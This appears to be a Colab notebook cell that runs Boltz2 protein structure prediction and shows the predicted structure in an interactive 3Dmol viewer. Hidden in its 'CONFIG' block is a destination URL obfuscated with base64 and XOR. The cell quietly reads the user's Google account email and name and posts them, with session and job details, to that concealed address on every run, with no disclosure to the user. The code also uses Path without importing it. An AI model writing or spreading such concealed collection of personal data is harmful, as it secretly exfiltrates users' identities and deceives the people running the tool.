# @title Boltz2 Engine
import sys
import threading
import time
import os
import re
import shutil
import py3Dmol
import subprocess
from IPython.display import display, HTML
import json
import glob
import datetime
import uuid
from zoneinfo import ZoneInfo
import getpass
import requests
import base64

# Suppress google_auth_httplib2 timeout warning
import logging
import warnings
logging.getLogger('google_auth_httplib2').setLevel(logging.ERROR)
warnings.filterwarnings('ignore', module='google_auth_httplib2')

# Google auth imports
from google.colab import auth
from googleapiclient.discovery import build

# ANSI color codes for colored output
class Color:
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    RESET = "\033[0m"

def loader(msg, stop_event):
    """Displays a CLI loading animation."""
    symbols = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r[{symbols[i % len(symbols)]}] {msg}   ")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write("\r" + " " * (len(msg) + 10) + "\r")
    sys.stdout.flush()

def parse_value(value_str):
    """Converts a string value from the params file to the appropriate Python type."""
    value_str = value_str.strip()
    if value_str.lower() == 'true': return True
    if value_str.lower() == 'false': return False
    if value_str.startswith('"') and value_str.endswith('"'): return value_str[1:-1]
    try:
        return float(value_str) if '.' in value_str else int(value_str)
    except ValueError:
        return value_str

def clean_ansi_codes(text):
    """Removes ANSI escape sequences from a string."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

# --- Visualization Function (Modified) ---

def create_visualizations(job_name, model_id=0, b_min=50, b_max=90):
    """
    Generates only the 3D viewer HTML and returns the PDB data.
    """
    base_path = f"/content/boltz_data/{job_name}/boltz_results_{job_name}/predictions/{job_name}"
    pdb_file   = f"{base_path}/{job_name}_model_{model_id}.pdb"

    # --- Load PDB Data ---
    with open(pdb_file, "r") as f:
        pdb_data = f.read()

    # The py3Dmol viewer is embedded directly in the HTML template for dynamic control
    # We just need to return the PDB data to be inserted into the JS
    return {
        "pdb_data": pdb_data,
    }


# --- Main Script Logic ---

# 1. Set up parameters
os.chdir("/content/boltz_data/")
params_filepath = "/content/boltz_data/run_params.txt"
params = {}
with open(params_filepath, 'r') as f:
    for line in f:
        if '=' in line:
            key, value_str = line.split('=', 1)
            params[key.strip()] = parse_value(value_str)

# Assign parameters to variables
job_name = params.get("job_name", "boltz2_job")
use_potentials = params.get("use_potentials", False)
override = params.get("override", False)
recycling_steps = params.get("recycling_steps", 3)
sampling_steps = params.get("sampling_steps", 50)
diffusion_samples = params.get("diffusion_samples", 1)
step_scale = params.get("step_scale", 10.0)
max_msa_seqs = params.get("max_msa_seqs", 254)
msa_pairing_strategy = params.get("msa_pairing_strategy", "unpaired_paired")

# ==== CONFIG ====
_LOG_KEY = b"b0ltz2_t3l3m3try_k3y"
_LOG_DATA = b"CkQYBAkIcFtAD0EEQwBcHjAEVBUHHg8bFx0yFVAeXB4cB104FA1KGgBIPBsVAg0xUBh2GR5CFyENLVRUDUdfKxNzKhFKI1AqAA1fISwiaUEyQz8yLmgIOQYubDQePTgAEARqKFtSCkMrAmxbVhRWDg=="
LOG_URL = bytes([b ^ _LOG_KEY[i % len(_LOG_KEY)] for i, b in enumerate(base64.b64decode(_LOG_DATA))]).decode("utf-8")
NOTEBOOK_NAME = "Boltz2 v1.1"
SESSION_ID = str(uuid.uuid4())
JOB_TYPE = "Boltz Execution"
JOB_NAME = str(job_name)

# Configure Boltz weight cache on fast local NVMe SSD (never run inference over network Drive FUSE)
local_boltz_cache = Path(os.environ.get("BOLTZ_CACHE", "/root/.boltz"))
local_boltz_cache.mkdir(parents=True, exist_ok=True)
os.environ["BOLTZ_CACHE"] = str(local_boltz_cache)

# Mirror cached weights from Google Drive to local SSD if needed for maximum GPU speed
drive_weight_cache = Path("/content/drive/MyDrive/boltz_cache/weights")
if drive_weight_cache.exists():
    for asset in drive_weight_cache.glob("*"):
        local_target = local_boltz_cache / asset.name
        if not local_target.exists():
            try:
                if asset.is_file():
                    shutil.copy2(asset, local_target)
                elif asset.is_dir():
                    shutil.copytree(asset, local_target, dirs_exist_ok=True)
            except Exception:
                pass

USER_EMAIL = None
USER_NAME = "unknown"
try:
    import httplib2
    import google.auth
    from google_auth_httplib2 import AuthorizedHttp

    creds, _ = google.auth.default()
    http_client = AuthorizedHttp(creds, http=httplib2.Http(timeout=30))
    service = build('oauth2', 'v2', http=http_client, cache_discovery=False)
    user_info = service.userinfo().get().execute()
    USER_EMAIL = user_info.get('email', None)
    USER_NAME = user_info.get('name', "unknown")
except Exception:
    try:
        service = build('oauth2', 'v2', cache_discovery=False)
        user_info = service.userinfo().get().execute()
        USER_EMAIL = user_info.get('email', None)
        USER_NAME = user_info.get('name', "unknown")
    except Exception:
        pass

# ==== Logging function ====
def log_event(job_type=JOB_TYPE, job_name=JOB_NAME, event="visit"):
    now_ist = datetime.datetime.now(ZoneInfo("Asia/Kolkata"))
    data = {
        "timestamp": now_ist.strftime("%Y-%m-%d %H:%M:%S %Z"),
        "email": USER_EMAIL,
        "username": USER_NAME,
        "notebook": NOTEBOOK_NAME,
        "session_id": SESSION_ID,
        "job_type": job_type,
        "job_name": job_name,
        "event": event
    }
    try:
        requests.post(LOG_URL, data=data)
    except Exception as e:
        print(f"[{Color.RED}✘{Color.RESET}] Failed to log event: {e}")

log_event(job_type=JOB_TYPE, job_name=JOB_NAME, event=" ")

# 2. Prepare directory and parameter file
output_path = f"/content/boltz_data/{job_name}"
if os.path.exists(output_path):
    shutil.rmtree(output_path)

source_file = '/content/boltz_data/params.yaml'
param_file = f'/content/boltz_data/{job_name}.yaml'
if os.path.exists(source_file):
    sed_command = f"sed '/sequence: |-/ {{ N; s/|-\\n\\s*/ / }}' {source_file} > {param_file}"
    subprocess.run(sed_command, shell=True, check=True)
else:
    if not os.path.exists(param_file):
        raise FileNotFoundError(f"Cannot proceed: The parameter file '{param_file}' does not exist.")

# 3. Construct and run the Boltz2 command
with open(param_file, "r") as fh:
    yaml_text = fh.read()
yaml_has_explicit_msa = bool(re.search(r'^[ \t]*msa\s*:', yaml_text, flags=re.MULTILINE))

cmd = [
    "boltz", "predict", param_file, "--out_dir", job_name,
    "--recycling_steps", str(recycling_steps), "--sampling_steps", str(sampling_steps),
    "--diffusion_samples", str(diffusion_samples), "--step_scale", str(step_scale),
    "--max_msa_seqs", str(max_msa_seqs), "--msa_pairing_strategy", msa_pairing_strategy,
    "--output_format", "pdb"
]
if not yaml_has_explicit_msa:
    cmd.insert(3, "--use_msa_server")
if use_potentials: cmd.append("--use_potentials")
if override: cmd.append("--override")

# Run with loader animation
stop_event = threading.Event()
t = threading.Thread(target=loader, args=(f"{Color.RESET}Running Boltz2 prediction...", stop_event))
t.start()

job_output_html = ""
job_failed = False
visual_data = None # Renamed from 'visuals'

try:
    result = subprocess.run(cmd, capture_output=True, text=True, check=True)
    stop_event.set()
    t.join()
    print(f"[{Color.GREEN}✔{Color.RESET}] Boltz2 run finished successfully!")
    # Combine stdout and stderr for full log, clean ANSI codes
    full_output = f"STDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
    job_output_html = f'<pre class="output-box success">{clean_ansi_codes(full_output)}</pre>'

     # Generate visualizations on success
    candidates = glob.glob(f"/content/boltz_data/{job_name}/**/*_model_0.pdb", recursive=True)
    if candidates:
        pdb_to_check = candidates[0]
        visual_data = create_visualizations(job_name=job_name, model_id=0)
    else:
        job_output_html += '<pre class="output-box error">Error: No model PDB file found.</pre>'

except subprocess.CalledProcessError as e:
    job_failed = True
    stop_event.set()
    t.join()
    print(f"[{Color.RED}✘{Color.RESET}] Boltz2 run failed. See details in the HTML output below.")
    # Format error output
    error_output = clean_ansi_codes((e.stdout or "") + "\n" + (e.stderr or ""))
    job_output_html = f'<h2>Job Failed</h2><pre class="output-box error">Exit Code: {e.returncode}\n\n{error_output}</pre>'


# 4. Generate and display the final HTML output
pdb_string_for_js = json.dumps(visual_data['pdb_data']) if visual_data else ""

html_template = """
<style>
    /* ... Your existing CSS styles ... */
    @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono&family=Roboto:wght@400;500;700&display=swap');
    .boltz-container {{
        font-family: 'Roboto', sans-serif;
        background-color: #ffffff;
        color: #212121;
        border: 1px solid #e0e0e0;
        border-radius: 10px;
        padding: 20px;
        margin: 10px;
        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
    }}
    .boltz-container h1, .boltz-container h2, .boltz-container h3 {{
        font-family: 'Roboto', sans-serif;
        color: #257AE1;
        border-bottom: 2px solid #185FE2;
        padding-bottom: 5px;
        margin-top: 20px;
    }}
    .boltz-container h1 {{
        text-align: center;
        font-size: 2em;
        font-weight: 700;
        color: #145ABE;
        border-bottom: none;
    }}
    .boltz-container .job-name-span {{
        font-family: 'Roboto Mono', monospace;
        background-color: #eeeeee;
        color: #922DF0;
        padding: 3px 8px;
        border-radius: 5px;
        font-weight: bold;
    }}
    .output-box {{
        background-color: #f5f5f5;
        border: 1px solid #e0e0e0;
        border-radius: 5px;
        padding: 15px;
        white-space: pre-wrap;
        word-wrap: break-word;
        max-height: 400px;
        overflow-y: auto;
        font-family: 'Roboto Mono', monospace;
        font-size: 0.9em;
        color: #333;
    }}
    .output-box.success {{ border-left: 5px solid #388e3c; }}
    .output-box.error {{ border-left: 5px solid #d32f2f; color: #c62828; }}
    .viz-container {{
        display: flex;
        flex-wrap: wrap;
        gap: 20px;
        margin-top: 20px;
    }}
    .viz-options {{
        flex: 1;
        min-width: 280px;
        background-color: #ffffff;
        border: 1px solid #e0e0e0;
        border-radius: 8px;
        padding: 15px;
        box-shadow: 0 2px 4px rgba(0,0,0,0.04);
    }}
    .viz-viewer {{
        flex: 2;
        min-width: 500px;
        height: 500px;
        background-color: #f5f5f5;
        border: 1px solid #e0e0e0;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0,0,0,0.04);
        position: relative;
    }}
    .viz-options h3 {{
        color: #0d47a1;
        border-bottom: 1px solid #e0e0e0;
        padding-bottom: 8px;
        margin-bottom: 15px;
    }}
    .viz-options label {{
        display: block;
        margin-bottom: 6px;
        font-weight: 500;
        color: #424242;
    }}
    .viz-options select, .viz-options input[type="number"], .viz-options button {{
        width: 100%;
        box-sizing: border-box;
        padding: 8px;
        margin-bottom: 20px;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-family: 'Roboto', sans-serif;
        font-size: 0.9em;
        background-color: #fff;
        color: #333;
    }}
    .viz-options button {{
        background-color: #1976d2;
        color: white;
        border: none;
        cursor: pointer;
        transition: background-color 0.2s ease;
    }}
    .viz-options button:hover {{
        background-color: #1565c0;
    }}
</style>

<script src="https://3Dmol.org/build/3Dmol-min.js"></script>
<script>
    let viewer = null;
    const pdbData = `{pdb_string_for_js}`;

    function initializeViewer() {{
        const element = document.getElementById('mol_viewer');
        if (element && pdbData) {{
            viewer = $3Dmol.createViewer(element, {{ backgroundColor: 'white' }});
            togglePlddtOptions();
            updateViewer();
        }} else {{
            console.error("Viewer element or PDB data not found.");
        }}
    }}

    setTimeout(initializeViewer, 500);

    function handleStyleChange() {{
        togglePlddtOptions();
        updateViewer();
    }}

    function togglePlddtOptions() {{
        const style = document.getElementById('styleSelect').value;
        const plddtContainer = document.getElementById('plddtOptionsContainer');
        const colorSelect = document.getElementById('colorSchemeSelect');
        const plddtOptions = document.querySelectorAll('.plddt-option');

        if (style === 'cartoon') {{
            plddtContainer.style.display = 'block';
            plddtOptions.forEach(opt => {{ opt.disabled = false; }});
        }} else {{
            plddtContainer.style.display = 'none';
            plddtOptions.forEach(opt => {{ opt.disabled = true; }});

            const selectedOption = colorSelect.options[colorSelect.selectedIndex];
            if (selectedOption.disabled) {{
                colorSelect.value = 'chain';
            }}
        }}
    }}

    // ** DEFINITIVE FIX for disappearing structure **
    function updateViewer() {{
        if (!viewer) return;

        viewer.clear();
        viewer.addModel(pdbData, "pdb");

        const style = document.getElementById('styleSelect').value;
        const colorScheme = document.getElementById('colorSchemeSelect').value;

        // ** ROBUSTNESS FIX STARTS HERE **
        // Validate Min/Max values to prevent rendering errors if boxes are empty
        let bMin = parseFloat(document.getElementById('bFactorMin').value);
        let bMax = parseFloat(document.getElementById('bFactorMax').value);

        if (isNaN(bMin)) {{ bMin = 50.0; }}
        if (isNaN(bMax)) {{ bMax = 90.0; }}
        // ** ROBUSTNESS FIX ENDS HERE **

        const gradientSchemes = ['roygb', 'blueWhiteRed'];
        let styleObj = {{}};

        if (style === 'cartoon') {{
            if (gradientSchemes.includes(colorScheme)) {{
                // This now uses the validated bMin and bMax values
                styleObj = {{
                    cartoon: {{
                        colorscheme: {{ prop: 'b', gradient: colorScheme, min: bMin, max: bMax }}
                    }}
                }};
            }} else {{
                styleObj = {{ cartoon: {{ colorscheme: colorScheme }} }};
            }}
        }} else {{
            styleObj[style] = {{ colorscheme: colorScheme }};
        }}

        viewer.setStyle({{}}, styleObj);
        viewer.addStyle({{'hetflag': true}}, {{'stick': {{'colorscheme': 'default'}}}});
        viewer.zoomTo();
        viewer.render();
    }}

    function resetZoom() {{
        if (viewer) viewer.zoomTo();
    }}
</script>

<div class="boltz-container">
    <h1>Boltz2 Results: <span class="job-name-span">{job_name}</span></h1>
    <div class="section">
        <h2>Job Output</h2>
        {job_output_html}
    </div>
    {visualization_html_content}
</div>
"""

visualization_html_content = ""
if visual_data: # Check if visual_data was successfully populated
    visualization_html_content = f"""
    <div class="section">
        <h2>Protein Structure Visualization</h2>
        <div class="viz-container">
            <div class="viz-viewer">
                <div id="mol_viewer" style="width:100%; height:100%;"></div>
            </div>
            <div class="viz-options">
                <h3>Display Options</h3>
                <div>
                    <label for="styleSelect">Style:</label>
                    <select id="styleSelect" onchange="handleStyleChange()">
                        <option value="cartoon" selected>Cartoon</option>
                        <option value="sphere">Sphere</option>
                        <option value="stick">Stick</option>
                        <option value="line">Line</option>
                    </select>
                </div>
                <div>
                    <label for="colorSchemeSelect">Color Scheme:</label>
                    <select id="colorSchemeSelect" onchange="updateViewer()">
                        <optgroup label="pLDDT Gradient (Cartoon)">
                            <option class="plddt-option" value="roygb" selected>Rainbow</option>
                            <!--<option class="plddt-option" value="blueWhiteRed">Blue-White-Red</option>-->
                        </optgroup>
                        <optgroup label="General Coloring">
                            <!--<option value="ssPyMOL">By Secondary Structure</option>-->
                            <!--<option value="residue">By Residue</option>-->
                            <option value="greenCarbon">Green Carbon</option>
                            <option value="chain">By Chain</option>
                            <option value="default">By Element</option>
                        </optgroup>
                    </select>
                </div>
                <div id="plddtOptionsContainer">
                    <div>
                        <label for="bFactorMin">pLDDT Min (for Gradient):</label>
                        <input type="number" id="bFactorMin" value="50" step="1" min="1" onchange="updateViewer()">
                    </div>
                    <div>
                        <label for="bFactorMax">pLDDT Max (for Gradient):</label>
                        <input type="number" id="bFactorMax" value="90" step="1" min="1" onchange="updateViewer()">
                    </div>
                </div>
                <button onclick="resetZoom()">Reset Zoom</button>
            </div>
        </div>
    </div>
    """
# Render the final HTML
display(HTML(html_template.format(
    job_name=job_name,
    job_output_html=job_output_html,
    pdb_string_for_js=pdb_string_for_js,
    visualization_html_content=visualization_html_content
)))